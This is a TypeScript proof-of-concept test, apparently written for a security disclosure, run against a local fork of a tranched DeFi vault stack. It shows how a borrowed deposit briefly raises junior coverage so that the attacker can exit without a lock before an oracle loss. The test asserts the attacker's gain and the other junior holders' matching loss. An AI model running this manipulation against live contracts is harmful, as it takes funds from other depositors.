import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
import { UTest } from 'atma-utest';
import { $require } from 'dequanto/utils/$require';
import { $bigint } from 'dequanto/utils/$bigint';
import { $date } from 'dequanto/utils/$date';
import { $hh } from '../utils/$hh';
import { $erc20 } from '../utils/$erc20';
import { $erc4626 } from '../utils/$erc4626';
import { $exitMode } from '@s/utils/$exitMode';

/**
 * Economic impact PoC for the transient-coverage bypass.
 *
 * This uses the real mHYPER Strata stack and its existing MockOracle. The oracle
 * price is dropped by 4% in BOTH worlds. In the attack world the attacker exits
 * JRT into mHYPER before the drop, so the attacker still suffers the same 4%
 * underlying strategy-token loss. The only exposure avoided is JRT's additional
 * first-loss obligation to protect SRT.
 *
 * Temporary capital is modeled as a 126 mHYPER loan. The exact mHYPER units are
 * returned to the lender before the price loss. No assumption that the attacker
 * can escape or sell ahead of the underlying loss is required.
 */

const hh = new HardhatProvider();
const attacker = await hh.deployer(1);
const liquidityProvider = await hh.deployer(2);
const lender = await hh.deployer(3);
const test = await $hh.create('mhyper');

const {
    mHYPER,
    oracle,
    jrtVault,
    srtVault,
    feed,
    cdo,
    strategy,
} = await test.deploy();

const { client, deployer } = test;
const { sharesCooldown } = await test.factory.ensureCooldowns(cdo);

await test.factory.addRoles({
    [cdo.address]: [
        await sharesCooldown.COOLDOWN_WORKER_ROLE(),
    ]
});

// Keep the APR feed valid and neutral so the differential comes from the same
// 4% strategy-token loss, not APR drift.
await feed.$receipt().setRoundStaleAfter(deployer, BigInt($date.parseTimespan('5years', { get: 's' })));
let t0 = (await client.getBlock('latest')).timestamp;
await oracle.$receipt().setRoundData(deployer, 1n, 100_000_000n, BigInt(t0)); // $1.00
await feed.$receipt().updateRoundData(deployer, 0, 0, t0);

await sharesCooldown.$receipt().setTwoStepConfigManager(test.deployer, attacker.address);

// Exact mHYPER JRT exit tiers from src/platforms/Tranches.ts.
await $exitMode.set(sharesCooldown, attacker, jrtVault.address, [
    { covPct: 10, feeBps: 0,  lock: '21days' },
    { covPct: 20, feeBps: 10, lock: '7days'  },
    { covPct: 0,  feeBps: 20, lock: 0        },
]);

// 100 JRT / 1000 SRT = 10% coverage. Attacker owns 25% of JRT.
await $erc20.mint(mHYPER, deployer, liquidityProvider, 1_075);
await $erc20.mint(mHYPER, deployer, attacker, 25);
await $erc4626.depositMeta(jrtVault, mHYPER.address, liquidityProvider, 75);
await $erc4626.depositMeta(jrtVault, mHYPER.address, attacker, 25);
await $erc4626.depositMeta(srtVault, mHYPER.address, liquidityProvider, 1_000);

let initialCoverage = Number(await cdo.coverage());
$require.gte(initialCoverage, 99_900);
$require.lte(initialCoverage, 100_100);

await test.snapshot('transient-coverage-impact');

UTest.create({
    async $after () {
        await test.wipe();
    },
    async $teardown () {
        await test.reset('transient-coverage-impact');
    },

    async 'attack retains more value than the locked control after the same 4% mHYPER loss, while remaining JRT loses the difference' () {
        // ---------------- Control world ----------------
        let oldShares = await jrtVault.balanceOf(attacker.address);
        let lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        let controlImmediate = await $erc4626.redeemMeta(jrtVault, mHYPER.address, attacker, oldShares);
        $require.eq(controlImmediate, 0n, '10% coverage must lock the existing JRT');
        $require.gt(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        await applyFourPercentLoss();
        await test.mine('21days');

        await sharesCooldown.$receipt().finalize(attacker, jrtVault.address, mHYPER.address, attacker.address);

        let controlUnits = await mHYPER.balanceOf(attacker.address);
        let controlValue = await strategy.convertToAssets(mHYPER.address, controlUnits, 0);
        let controlLpValue = await jrtVault.convertToAssets(lpShares);

        $require.gt(controlValue, 0n);

        // ---------------- Attack world ----------------
        await test.reset('transient-coverage-impact');

        oldShares = await jrtVault.balanceOf(attacker.address);
        lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        const temporaryLoan = 126n * 10n ** 18n;
        await $erc20.mint(mHYPER, deployer, lender, temporaryLoan);
        await $erc20.transfer(mHYPER, lender, attacker.address, temporaryLoan);

        // The borrowed mHYPER is temporary Junior NAV. Coverage rises from 10% to
        // >20%, selecting the zero-lock / 20 bps tier.
        await $erc4626.depositMeta(jrtVault, mHYPER.address, attacker, temporaryLoan);
        $require.gt(Number(await cdo.coverage()), 200_000);

        // First independent withdrawal: pre-existing JRT exits immediately.
        let oldAssetsOut = await $erc4626.redeemMeta(jrtVault, mHYPER.address, attacker, oldShares);
        $require.gt(oldAssetsOut, 0n);

        // Coverage remains >20% after that withdrawal, so the temporary JRT also
        // independently receives the immediate tier.
        $require.gt(Number(await cdo.coverage()), 200_000);
        let temporaryShares = await jrtVault.balanceOf(attacker.address);
        let temporaryAssetsOut = await $erc4626.redeemMeta(jrtVault, mHYPER.address, attacker, temporaryShares);
        $require.gt(temporaryAssetsOut, 0n);

        $require.eq(await jrtVault.balanceOf(attacker.address), 0n);
        $require.eq(await jrtVault.balanceOf(sharesCooldown.address), 0n);
        $require.lt(Number(await cdo.coverage()), 100_000, 'coverage must collapse back below the 10% protected threshold');

        // Repay the exact borrowed strategy-token units BEFORE the loss.
        $require.gte(await mHYPER.balanceOf(attacker.address), temporaryLoan);
        await $erc20.transfer(mHYPER, attacker, lender.address, temporaryLoan);
        $require.eq(await mHYPER.balanceOf(lender.address), temporaryLoan);

        // Same 4% mHYPER price loss as the control world. The attacker is not
        // immune to underlying strategy loss; their remaining mHYPER falls too.
        await applyFourPercentLoss();

        let attackUnits = await mHYPER.balanceOf(attacker.address);
        let attackValue = await strategy.convertToAssets(mHYPER.address, attackUnits, 0);
        let attackLpValue = await jrtVault.convertToAssets(lpShares);

        let attackerAdvantage = attackValue - controlValue;
        let remainingJrtVictimLoss = controlLpValue - attackLpValue;

        // This is far above rounding noise (USDC has 6 decimals). The attacker
        // preserves multiple whole base-asset units by escaping first-loss JRT.
        $require.gt(attackerAdvantage, 5n * 10n ** 6n);
        $require.gt(remainingJrtVictimLoss, 5n * 10n ** 6n);

        // The attacker advantage and remaining-Junior loss should be economically
        // the same root, allowing small differences for the configured exit fees.
        let diff = attackerAdvantage > remainingJrtVictimLoss
            ? attackerAdvantage - remainingJrtVictimLoss
            : remainingJrtVictimLoss - attackerAdvantage;
        $require.lt(diff, 1n * 10n ** 6n);
    }
});

async function applyFourPercentLoss () {
    await test.mine('1sec');
    let t = (await client.getBlock('latest')).timestamp;
    await oracle.$receipt().setRoundData(deployer, 2n, 96_000_000n, BigInt(t)); // $0.96
}
